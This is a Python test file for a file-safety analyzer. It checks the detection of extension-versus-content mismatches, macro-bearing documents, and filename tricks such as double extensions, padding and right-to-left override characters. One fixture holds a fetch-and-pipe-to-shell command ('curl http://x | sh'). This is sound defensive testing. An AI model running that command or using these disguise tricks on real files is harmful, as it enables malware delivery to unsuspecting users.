"""Extension-vs-real-type mismatch and name-trick tests."""
import io
import zipfile

from helpers import SentinelTestCase, MACHO_ARM64, unsigned_checker

from sentinel import analyzer, filetype as ft


def _zip(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


class MismatchTests(SentinelTestCase):
    def analyze(self, p):
        return analyzer.analyze_file(p, use_network=False, sig_checker=unsigned_checker)

    def test_pdf_that_is_really_macho(self):
        p = self.write("invoice.pdf", MACHO_ARM64)
        info = ft.sniff(p)
        self.assertEqual(info.category, ft.EXECUTABLE)
        self.assertIn("arm64", info.label)
        rec = self.analyze(p)
        self.assertEqual(rec["verdict"], "dangerous")
        self.assertIn("ext_type_mismatch", self.codes(rec))
        self.assertEqual(rec["type"]["claimed_extension"], "pdf")

    def test_jpg_that_is_windows_exe(self):
        rec = self.analyze(self.write("holiday.jpg", b"MZ\x90\x00" + b"\x00" * 100))
        self.assertIn("ext_type_mismatch", self.codes(rec))
        self.assertEqual(rec["verdict"], "dangerous")

    def test_docx_that_is_shell_script(self):
        rec = self.analyze(self.write("resume.docx", b"#!/bin/bash\ncurl http://x | sh\n"))
        self.assertIn("ext_type_mismatch", self.codes(rec))
        self.assertEqual(rec["verdict"], "dangerous")

    def test_pdf_that_is_disk_image(self):
        data = b"\x00" * 2048 + b"koly" + b"\x00" * 508
        rec = self.analyze(self.write("statement.pdf", data))
        self.assertEqual(rec["type"]["real_category"], ft.DISK_IMAGE)
        self.assertIn("ext_type_mismatch", self.codes(rec))

    def test_real_pdf_is_clean(self):
        rec = self.analyze(self.write("report.pdf", b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n"))
        self.assertEqual(rec["verdict"], "clean")
        self.assertNotIn("ext_type_mismatch", self.codes(rec))

    def test_real_docx_is_document_not_archive(self):
        data = _zip({"[Content_Types].xml": "<Types/>", "word/document.xml": "<w/>"})
        rec = self.analyze(self.write("letter.docx", data))
        self.assertEqual(rec["type"]["real_category"], ft.DOCUMENT)
        self.assertEqual(rec["verdict"], "clean")

    def test_docx_with_macros_flagged(self):
        data = _zip({"[Content_Types].xml": "<Types/>", "word/vbaProject.bin": "x"})
        rec = self.analyze(self.write("letter.docx", data))
        self.assertIn("macros", self.codes(rec))
        self.assertEqual(rec["verdict"], "caution")

    def test_double_extension(self):
        rec = self.analyze(self.write("invoice.pdf.app", MACHO_ARM64))
        self.assertIn("name_double_extension", self.codes(rec))
        self.assertEqual(rec["verdict"], "dangerous")

    def test_padded_extension(self):
        tricks = ft.name_tricks("invoice.pdf          .command")
        self.assertTrue(any(t.kind == "padded_extension" for t in tricks))

    def test_rtlo_name_trick(self):
        name = "invoice‮fdp.command"   # displays as "invoicedmmoc.pdf"-ish
        rec = self.analyze(self.write(name, b"#!/bin/sh\necho hi\n"))
        self.assertIn("name_bidi", self.codes(rec))
        self.assertEqual(rec["verdict"], "dangerous")

    def test_zip_containing_app_and_trick(self):
        data = _zip({"Photos.app/Contents/MacOS/Photos": "x", "Photos.app/Contents/Info.plist": "x",
                     "readme.pdf.command": "#!/bin/sh"})
        rec = self.analyze(self.write("photos.zip", data))
        self.assertIn("archive_executables", self.codes(rec))
        self.assertIn("archive_name_trick", self.codes(rec))
        self.assertIn("Photos.app", " ".join(rec["type"]["archive_runnable_members"]))

    def test_zip_named_as_pdf(self):
        rec = self.analyze(self.write("scan.pdf", _zip({"a.txt": "hi"})))
        self.assertIn("ext_type_mismatch", self.codes(rec))

    def test_partial_downloads_ignored(self):
        self.assertTrue(ft.is_partial_download("setup.dmg.crdownload"))
        self.assertTrue(ft.is_ignorable(".DS_Store"))
        self.assertFalse(ft.is_ignorable("setup.dmg"))
